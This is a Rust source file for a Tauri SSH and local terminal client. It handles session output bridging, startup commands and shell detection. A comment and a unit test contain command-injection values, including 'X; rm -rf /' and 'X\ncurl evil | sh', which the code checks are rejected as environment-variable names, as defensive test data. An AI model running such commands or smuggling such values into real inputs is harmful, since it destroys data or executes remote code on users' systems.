use termius_core::sync_ext::MutexExt;
use crate::state::{AppState, TerminalBackend, TerminalSession};
use crate::util;
use serde::Serialize;
use tauri::ipc::{Channel, InvokeResponseBody};
use tauri::{AppHandle, Emitter, State};
use termius_core::model::{HostId, Workspace};
use termius_core::ssh::{self, ShellInput};
use tokio::sync::mpsc;
use uuid::Uuid;

#[derive(Serialize, Clone)]
pub(crate) struct TerminalClosedEvent {
    id: String,
}

/// Forwards a session's raw output channel to the frontend as raw bytes over
/// its dedicated `channel` (no JSON/base64 — same reasoning as RDP frames,
/// see `commands::rdp_view::connect_rdp_view`'s doc comment) until it closes,
/// then emits a plain `terminal-closed` event (fires at most once per
/// session, so its JSON overhead doesn't matter). Shared by every session
/// backend (SSH shell, Docker exec, ...) so each one only needs to produce a
/// plain `mpsc::Receiver<Vec<u8>>`, not know about Tauri events/channels
/// itself.
pub(crate) fn spawn_output_bridge(app: AppHandle, session_id: String, channel: Channel, mut output: mpsc::Receiver<Vec<u8>>) {
    tokio::spawn(async move {
        while let Some(bytes) = output.recv().await {
            if channel.send(InvokeResponseBody::Raw(bytes)).is_err() {
                break;
            }
        }
        let _ = app.emit("terminal-closed", TerminalClosedEvent { id: session_id });
    });
}

/// Wraps a value in single quotes, escaping any embedded single quotes.
fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Whether `key` is a safe environment-variable name to splice into a shell
/// `export` command. The *value* is single-quoted by [`shell_quote`], but the
/// name is not, so an attacker-influenced key — e.g. `X; curl evil | sh` coming
/// from an imported host file — would otherwise run as a command on connect.
/// Restrict to the POSIX-portable name shape (`[A-Za-z_][A-Za-z0-9_]*`).
fn is_valid_env_key(key: &str) -> bool {
    let mut chars = key.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Startup commands common to any shell-like session for `host_id`: `export`
/// lines for `host.env_vars`, then each configured `startup_snippets`'
/// command, in that order — matches `Host::startup_snippets`'s doc comment.
/// Shared by [`connect_terminal`] (SSH) and
/// [`crate::commands::docker::connect_docker_exec`] (Docker exec): both open
/// a POSIX-ish shell on the other end and drive it the same way.
pub(crate) fn startup_commands(workspace: &Workspace, host_id: HostId) -> Vec<Vec<u8>> {
    let mut cmds = Vec::new();
    if let Some(host) = workspace.host(host_id) {
        for ev in &host.env_vars {
            if is_valid_env_key(&ev.key) {
                cmds.push(format!("export {}={}\n", ev.key, shell_quote(&ev.value)).into_bytes());
            }
        }
        for &sid in &host.startup_snippets {
            if let Some(snip) = workspace.snippets.iter().find(|s| s.id == sid) {
                cmds.push(format!("{}\n", snip.command).into_bytes());
            }
        }
    }
    cmds
}

/// Finishes wiring a freshly-opened shell session into the app: spawns the
/// `terminal-data` output bridge, replays `host_id`'s startup commands, and
/// registers the session under a new id. Shared tail of [`connect_terminal`]
/// (SSH) and [`crate::commands::docker::connect_docker_exec`] — both hand it
/// the very same [`ssh::ShellSession`] shape once their backend-specific
/// connect step is done, so only that step still differs between the two.
pub(crate) async fn register_shell_session(
    app: AppHandle,
    state: &AppState,
    workspace: &Workspace,
    host_id: HostId,
    backend: TerminalBackend,
    channel: Channel,
    session: ssh::ShellSession,
) -> String {
    let session_id = Uuid::new_v4().to_string();
    let ssh::ShellSession { input, output } = session;

    spawn_output_bridge(app, session_id.clone(), channel, output);

    for cmd in startup_commands(workspace, host_id) {
        let _ = input.send(ShellInput::Data(cmd)).await;
    }

    state.terminals.lock_recover().insert(session_id.clone(), TerminalSession { backend, input });
    session_id
}

/// Connects to `host_id` and starts an interactive shell, streaming its
/// output back as raw bytes over `channel` (see [`spawn_output_bridge`]) —
/// `channel` is a dedicated `tauri::ipc::Channel` the caller creates just for
/// this session, mirroring `connect_rdp_view`'s frame channel.
#[tauri::command]
pub async fn connect_terminal(app: AppHandle, state: State<'_, AppState>, host_id: HostId, channel: Channel) -> Result<String, String> {
    let workspace = state.workspace.lock_recover().clone();
    let agent_forward = workspace.host(host_id).map(|h| h.agent_forward).unwrap_or(false);
    let connection = ssh::connect(&workspace, host_id).await.map_err(|e| e.to_string())?;
    let shell = ssh::open_shell(&connection, 80, 24, agent_forward).await.map_err(|e| e.to_string())?;

    Ok(register_shell_session(app, &state, &workspace, host_id, TerminalBackend::Ssh(connection), channel, shell).await)
}

fn terminal_input(state: &AppState, session_id: &str) -> Result<tokio::sync::mpsc::Sender<ShellInput>, String> {
    state.terminals.lock_recover().get(session_id).map(|t| t.input.clone()).ok_or_else(|| "session inconnue".to_string())
}

#[tauri::command]
pub async fn write_terminal(state: State<'_, AppState>, session_id: String, data: String) -> Result<(), String> {
    let bytes = util::decode(&data).map_err(|e| e.to_string())?;
    let input = terminal_input(&state, &session_id)?;
    input.send(ShellInput::Data(bytes)).await.map_err(|_| "session fermée".to_string())
}

#[tauri::command]
pub async fn resize_terminal(state: State<'_, AppState>, session_id: String, cols: u16, rows: u16) -> Result<(), String> {
    let input = terminal_input(&state, &session_id)?;
    input.send(ShellInput::Resize { cols, rows }).await.map_err(|_| "session fermée".to_string())
}

#[tauri::command]
pub fn close_terminal(state: State<'_, AppState>, session_id: String) -> Result<(), String> {
    state.terminals.lock_recover().remove(&session_id);
    Ok(())
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
pub struct ShellInfo {
    pub id: String,
    pub label: String,
}

fn shell_on_path(exe: &str) -> bool {
    std::env::var("PATH").is_ok_and(|path_var| {
        let sep = if cfg!(windows) { ';' } else { ':' };
        path_var.split(sep).any(|dir| std::path::Path::new(dir).join(exe).is_file())
    })
}

/// Detects interactive shells available on this system, so the user can pick one
/// when opening a local terminal (e.g. cmd vs PowerShell on Windows) instead of
/// always getting the one hardcoded default.
#[tauri::command]
pub fn list_local_shells() -> Vec<ShellInfo> {
    let mut shells = Vec::new();

    if cfg!(windows) {
        // Always present on any normal Windows install — no need to probe PATH for these.
        shells.push(ShellInfo { id: "powershell.exe".to_string(), label: "Windows PowerShell".to_string() });
        shells.push(ShellInfo { id: "cmd.exe".to_string(), label: "Invite de commandes (cmd)".to_string() });
        if shell_on_path("pwsh.exe") {
            shells.push(ShellInfo { id: "pwsh.exe".to_string(), label: "PowerShell 7".to_string() });
        }
        for git_bash in [r"C:\Program Files\Git\bin\bash.exe", r"C:\Program Files (x86)\Git\bin\bash.exe"] {
            if std::path::Path::new(git_bash).is_file() {
                shells.push(ShellInfo { id: git_bash.to_string(), label: "Git Bash".to_string() });
                break;
            }
        }
        let wsl = r"C:\Windows\System32\wsl.exe";
        if std::path::Path::new(wsl).is_file() {
            shells.push(ShellInfo { id: wsl.to_string(), label: "WSL".to_string() });
        }
    } else {
        let mut seen = std::collections::HashSet::new();
        if let Ok(current) = std::env::var("SHELL")
            && !current.is_empty() && seen.insert(current.clone()) {
            let label = current.rsplit('/').next().unwrap_or(&current);
            shells.push(ShellInfo { id: current.clone(), label: format!("{label} (courant)") });
        }
        if let Ok(content) = std::fs::read_to_string("/etc/shells") {
            for line in content.lines() {
                let path = line.trim();
                if path.is_empty() || path.starts_with('#') || !std::path::Path::new(path).is_file() { continue; }
                if seen.insert(path.to_string()) {
                    let label = path.rsplit('/').next().unwrap_or(path).to_string();
                    shells.push(ShellInfo { id: path.to_string(), label });
                }
            }
        }
    }

    shells
}

#[tauri::command]
pub async fn open_local_terminal(app: AppHandle, state: State<'_, AppState>, shell: Option<String>, channel: Channel) -> Result<String, String> {
    use portable_pty::{native_pty_system, CommandBuilder, PtySize};
    use std::io::Read;

    let shell = termius_core::local_shell::resolve_local_shell(shell.as_deref());

    let pty_system = native_pty_system();
    let pair = pty_system
        .openpty(PtySize { rows: 24, cols: 80, pixel_width: 0, pixel_height: 0 })
        .map_err(|e| e.to_string())?;

    let cmd = CommandBuilder::new(&shell);
    pair.slave.spawn_command(cmd).map_err(|e| e.to_string())?;
    drop(pair.slave);

    let writer = pair.master.take_writer().map_err(|e| e.to_string())?;
    let mut reader = pair.master.try_clone_reader().map_err(|e| e.to_string())?;

    let session_id = Uuid::new_v4().to_string();
    let emit_id = session_id.clone();
    let app_handle = app.clone();
    tokio::task::spawn_blocking(move || {
        let mut buf = [0u8; 4096];
        loop {
            match reader.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if channel.send(InvokeResponseBody::Raw(buf[..n].to_vec())).is_err() {
                        break;
                    }
                }
            }
        }
        let _ = app_handle.emit("terminal-closed", TerminalClosedEvent { id: emit_id });
    });

    state.local_terminals.lock_recover().insert(
        session_id.clone(),
        crate::state::LocalTerminalSession { master: crate::state::SendMasterPty(pair.master), writer },
    );

    Ok(session_id)
}

#[tauri::command]
pub async fn write_local_terminal(app: AppHandle, session_id: String, data: String) -> Result<(), String> {
    let bytes = util::decode(&data).map_err(|e| e.to_string())?;
    // The write is a blocking std::io::Write call (kernel PTY buffer) — every
    // keystroke to a local terminal goes through this command, so keep it off
    // the tokio worker thread the same way the read side already does.
    tokio::task::spawn_blocking(move || {
        use std::io::Write;
        use tauri::Manager;
        let state = app.state::<AppState>();
        let mut sessions = state.local_terminals.lock_recover();
        let session = sessions.get_mut(&session_id).ok_or_else(|| "session inconnue".to_string())?;
        session.writer.write_all(&bytes).map_err(|e| e.to_string())
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
pub async fn resize_local_terminal(state: State<'_, AppState>, session_id: String, cols: u16, rows: u16) -> Result<(), String> {
    use portable_pty::PtySize;
    let sessions = state.local_terminals.lock_recover();
    let session = sessions.get(&session_id).ok_or_else(|| "session inconnue".to_string())?;
    session.master.0.resize(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 }).map_err(|e| e.to_string())
}

#[tauri::command]
pub fn close_local_terminal(state: State<'_, AppState>, session_id: String) -> Result<(), String> {
    state.local_terminals.lock_recover().remove(&session_id);
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn valid_env_keys_are_accepted() {
        for ok in ["PATH", "_x1", "MY_VAR", "A", "_"] {
            assert!(is_valid_env_key(ok), "{ok:?} should be a valid env key");
        }
    }

    #[test]
    fn injection_shaped_env_keys_are_rejected() {
        for bad in [
            "",
            "1abc",
            "A B",
            "X; rm -rf /",
            "X=$(id)",
            "X\ncurl evil | sh",
            "PATH-EXTRA",
        ] {
            assert!(!is_valid_env_key(bad), "{bad:?} must be rejected");
        }
    }

    #[test]
    fn shell_quote_neutralises_single_quotes() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("a'b"), r"'a'\''b'");
    }
}
